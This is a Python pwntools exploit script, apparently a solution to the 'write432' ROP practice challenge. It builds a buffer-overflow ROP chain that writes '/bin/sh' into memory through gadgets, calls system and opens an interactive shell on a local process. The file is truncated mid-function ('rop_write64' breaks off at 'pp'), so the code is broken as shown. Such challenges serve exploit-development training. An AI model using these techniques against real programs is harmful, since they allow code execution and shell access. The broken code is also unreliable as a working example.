from pwn import *
import struct
import binascii

DEBUG = True
def hex_to_ascii(s, bit64=False):
    
    if bit64:
        t = "<Q"
    else:
        t = "<I"
        pass
        
    a = struct.pack(t,s)
    if DEBUG:
        print binascii.hexlify(a)
    return a
    
        
def rop_write32(s, addr):
    ppr_addr = 0x80486da
    useful_gadget = 0x8048670
    ret_str = hex_to_ascii(ppr_addr)
    ret_str += hex_to_ascii(addr)
    ret_str += s
    ret_str += hex_to_ascii(useful_gadget)
    return ret_str
    

def rop_write64(s, addr):
    pp
def rop_insert_string(s, addr, bit64=False):
    """Insert a string at a given address in memory
    Args:
        s - string to insert
        addr - address in memory
        bit64 - Returns 64-bit str if True, otherwise 32-bit str
        
    Returns:
        ROP Chain (str)
    """ 
    ret_str = "aaaa" * 11
    
    if bit64:
        n = 8
        system_call = 0x400810
        pass
    else:
        n = 4
        system_call = 0x804865a
        pass
        
    i = 0
    strs = []
    s += "\x00"
    while (i+n) < len(s):
        strs.append(s[i:i+n])
        i += n
        pass
    if i < len(s):
        strs.append(s[i:])
        pass
    print strs
    
    tmp_addr = addr
    for rop_s in strs:
        ret_str += rop_write32(rop_s,tmp_addr)
        tmp_addr += n
        pass
        
    ret_str += hex_to_ascii(system_call)
    ret_str += hex_to_ascii(addr)
    return ret_str

def main_rop():
    p = process("./write432")
    #gdb.attach(p,"""
    #b *0x8048646
    #""")
    print p.recvuntil("!\n")
    a = rop_insert_string("/bin/sh",0x804a04a)
    print a
    #p.sendline("aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz")
    p.sendline(a)
    p.interactive()
if __name__ == "__main__":
    main_rop()
    

